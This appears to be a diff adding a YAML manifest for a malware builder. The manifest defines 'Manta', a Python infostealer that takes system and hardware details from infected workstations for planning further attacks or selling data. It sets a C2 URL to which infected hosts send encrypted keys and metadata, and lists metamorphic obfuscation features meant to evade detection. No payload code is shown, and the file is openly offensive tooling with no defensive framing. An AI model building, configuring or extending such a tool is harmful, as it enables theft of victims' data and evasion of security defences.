@@ -1,0 +1,21 @@
+name: Manta
+malware_type: Infostealer
+lang: Python
+auth_key: 1887509308309418244605469339184520403722
+description: |
+  Manta is an infostealer payload, designed to steal hardware, OS, and other information based on the workstation it has infected
+  The main idea is that it does not exfiltrate documents or else, but it exfiltrate informations for planning other attacks, selling data, ...
+
+specific_feature:
+  c2_url:
+    label: "C2 Server URL"
+    description: "The URL where the infected host should send its RSA encrypted AES key and metadata."
+    type: "text"
+    default: "https://example.com/api"
+
+available_features:
+- metamorphic-bloc_swap
+- metamorphic-dead_code
+- metamorphic-noop
+- metamorphic-rename_var
+- metamorphic-string_mutation
